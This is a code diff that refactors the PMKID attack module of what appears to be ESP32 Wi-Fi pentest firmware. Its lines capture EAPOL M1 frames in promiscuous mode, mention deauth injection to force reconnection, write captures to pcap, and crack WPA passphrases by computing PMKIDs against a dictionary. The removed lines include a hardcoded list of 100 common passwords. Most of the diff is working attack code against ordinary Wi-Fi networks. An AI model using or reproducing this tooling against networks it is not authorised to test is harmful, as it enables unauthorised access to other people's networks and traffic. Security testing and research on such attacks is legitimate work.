@@ -10,36 +10,13 @@
 #include "sdcard_manager.h"
 #include "lockscreen_manager.h"
 #include "clock_manager.h"
+#include "pcap_writer.h"
+#include "dot11.h"
+#include "wpa_crack.h"
 #include <SD.h>
 
 extern InputHandling inputHandler;
 extern SDCardManager sdCardManager;
-
-// ── Built-in top-100 common WPA passwords ────────────────────────────────────
-static const char* const kBuiltinPwds[] = {
-    "password",    "123456789",   "12345678",    "1q2w3e4r",    "sunshine",
-    "football",    "1234567890",  "computer",    "superman",    "internet",
-    "iloveyou",    "1qaz2wsx",    "baseball",    "whatever",    "princess",
-    "abcd1234",    "starwars",    "trustno1",    "password1",   "jennifer",
-    "michelle",    "mercedes",    "benjamin",    "11111111",    "samantha",
-    "victoria",    "alexander",   "987654321",   "asdf1234",    "1234qwer",
-    "qwertyuiop",  "q1w2e3r4",    "elephant",    "garfield",    "chocolate",
-    "jonathan",    "caroline",    "maverick",    "midnight",    "88888888",
-    "creative",    "qwerty123",   "cocacola",    "passw0rd",    "liverpool",
-    "blink182",    "asdfghjkl",   "danielle",    "scorpion",    "veronica",
-    "nicholas",    "asdfasdf",    "metallica",   "december",    "patricia",
-    "christian",   "spiderman",   "security",    "slipknot",    "november",
-    "jordan23",    "qwertyui",    "butterfly",   "swordfish",   "carolina",
-    "hardcore",    "corvette",    "12341234",    "remember",    "qwer1234",
-    "leonardo",    "snickers",    "williams",    "angelina",    "anderson",
-    "123123123",   "pakistan",    "marlboro",    "kimberly",    "00000000",
-    "snowball",    "sebastian",   "godzilla",    "hello123",    "champion",
-    "precious",    "einstein",    "napoleon",    "mountain",    "dolphins",
-    "charlotte",   "fernando",    "basketball",  "barcelona",   "87654321",
-    "paradise",    "motorola",    "brooklyn",    "stephanie",   "elizabeth",
-    "0123456789",
-};
-static constexpr int kBuiltinPwdCount = sizeof(kBuiltinPwds) / sizeof(kBuiltinPwds[0]);
 
 // ── PMKID state ───────────────────────────────────────────────────────────────
 struct PmkidData {
@@ -112,36 +89,11 @@ static void IRAM_ATTR rxCallback(void* buf, wifi_promiscuous_pkt_type_t pktType)
     uint16_t       len = ppkt->rx_ctrl.sig_len;
     if (len < 40) return;
 
-    uint8_t frameType = (d[0] >> 2) & 0x03;
-    if (frameType != 2) return;  // DATA only
-
-    uint8_t tods   = d[1] & 0x01;
-    uint8_t fromds = (d[1] >> 1) & 0x01;
-    if (tods && fromds) return;  // skip WDS 4-addr
-
-    int hdrLen = ((d[0] >> 4) & 0x08) ? 26 : 24;  // QoS adds 2B
-    if (len < (uint16_t)(hdrLen + 12)) return;
-
-    // BSSID: ToDS=1 → addr1 (d+4); FromDS=1 → addr2 (d+10)
-    const uint8_t* frameBssid = tods ? (d + 4) : (d + 10);
-    if (memcmp(frameBssid, (const void*)g_pmBssid, 6) != 0) return;
-
-    // LLC/SNAP EAPOL: AA AA 03 00 00 00 88 8E
-    const uint8_t* llc = d + hdrLen;
-    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
-    if (llc[6] != 0x88 || llc[7] != 0x8E) return;
-
-    const uint8_t* eapol = d + hdrLen + 8;
-    int eapolAvail = len - hdrLen - 8;
-    if (eapolAvail < 8) return;
-
-    if (eapol[1] != 0x03) return;                        // must be EAPOL-Key
-    if (eapol[4] != 0x02 && eapol[4] != 0x01) return;   // RSN or WPA
-
-    // M1: ACK set (kiLo bit7), MIC not set (kiHi bit0)
-    bool ack = (eapol[6] & 0x80) != 0;
-    bool mic = (eapol[5] & 0x01) != 0;
-    if (!ack || mic) return;
+    dot11::Eapol ev;
+    if (!dot11::parseEapol(d, len, ev)) return;                       // DATA+LLC 0x888E+EAPOL-Key
+    if (memcmp(dot11::dataBssid(d), (const void*)g_pmBssid, 6) != 0) return;
+    if (ev.p[4] != 0x02 && ev.p[4] != 0x01) return;                  // RSN or WPA descriptor
+    if (ev.msg != 1) return;                                          // M1 only (ACK set, MIC clear)
 
     uint8_t next = (pmHead + 1) % PM_RING_SIZE;
     if (next == pmTail) return;  // ring full — drop
@@ -226,22 +178,8 @@ void PmkidAttack::start(char* args) {
 bool PmkidAttack::tryPassword(const char* pwd,
                                mbedtls_md_context_t* ctx,
                                const mbedtls_md_info_t* sha1) {
-    uint8_t pmk[32];
-    mbedtls_pkcs5_pbkdf2_hmac(ctx,
-        (const uint8_t*)pwd,       strlen(pwd),
-        (const uint8_t*)g_pm.ssid, strlen(g_pm.ssid),
-        4096, 32, pmk);
-
-    // "PMK Name" (8B) || AP_MAC (6B) || STA_MAC (6B) = 20 bytes
-    uint8_t data[20];
-    memcpy(data,      "PMK Name",       8);
-    memcpy(data + 8,  g_pm.apMac,       6);
-    memcpy(data + 14, g_pm.clientMac,   6);
-
-    uint8_t hmac[20];
-    mbedtls_md_hmac(sha1, pmk, 32, data, 20, hmac);
-
-    return memcmp(hmac, g_pm.pmkid, 16) == 0;  // HMAC-SHA1-128 = first 16 bytes
+    return wpacrack::verifyPMKID(pwd, g_pm.ssid, g_pm.apMac, g_pm.clientMac,
+                                 g_pm.pmkid, ctx, sha1);
 }
 
 // ── Crack UI ──────────────────────────────────────────────────────────────────
@@ -363,18 +301,18 @@ void PmkidAttack::crack() {
 
     if (!done) {
         useSD = false;
-        for (int i = 0; i < kBuiltinPwdCount && !done; i++) {
+        for (int i = 0; i < wpacrack::kBuiltinCount && !done; i++) {
             tried++;
             uint32_t now = millis();
             if (now - lastRedraw >= 300) {
                 lastRedraw = now;
-                redraw(kBuiltinPwds[i]);
+                redraw(wpacrack::kBuiltins[i]);
                 char k = inputHandler.getKeyboardInput();
                 if (k == 'q' || k == 'Q') break;
                 vTaskDelay(1);
             }
-            if (tryPassword(kBuiltinPwds[i], &mdCtx, sha1)) {
-                strncpy(found, kBuiltinPwds[i], sizeof(found) - 1);
+            if (tryPassword(wpacrack::kBuiltins[i], &mdCtx, sha1)) {
+                strncpy(found, wpacrack::kBuiltins[i], sizeof(found) - 1);
                 done = true;
             }
         }
@@ -442,18 +380,7 @@ void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
         pcap = SD.open(fname, FILE_WRITE);
         fileOk = (bool)pcap;
-        if (fileOk) {
-            struct __attribute__((packed)) {
-                uint32_t magic    = 0xa1b2c3d4;
-                uint16_t vmaj     = 2;
-                uint16_t vmin     = 4;
-                int32_t  tz       = 0;
-                uint32_t sig      = 0;
-                uint32_t snap     = 65535;
-                uint32_t linktype = 105;  // LINKTYPE_IEEE802_11
-            } ghdr;
-            pcap.write((uint8_t*)&ghdr, sizeof(ghdr));
-        }
+        if (fileOk) pcap::writeGlobalHeader(pcap);
     }
 
     // WiFi: APSTA (needed for deauth injection to trigger re-association)
@@ -534,14 +461,7 @@ void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
     // Write M1 frame to pcap after WiFi teardown (GDMA rule — no SD during WiFi)
     auto finalizePcap = [&]() {
         if (!fileOk || g_pm.m1RawLen == 0) { if (fileOk) { pcap.flush(); pcap.close(); } return; }
-        struct __attribute__((packed)) {
-            uint32_t ts_sec; uint32_t ts_usec; uint32_t incl_len; uint32_t orig_len;
-        } rh;
-        rh.ts_sec   = g_pm.m1Ts / 1000;
-        rh.ts_usec  = (g_pm.m1Ts % 1000) * 1000;
-        rh.incl_len = rh.orig_len = g_pm.m1RawLen;
-        pcap.write((uint8_t*)&rh, sizeof(rh));
-        pcap.write(g_pm.m1Raw, g_pm.m1RawLen);
+        pcap::writeRecord(pcap, g_pm.m1Raw, g_pm.m1RawLen, g_pm.m1Ts);
         pcap.flush();
         pcap.close();
     };
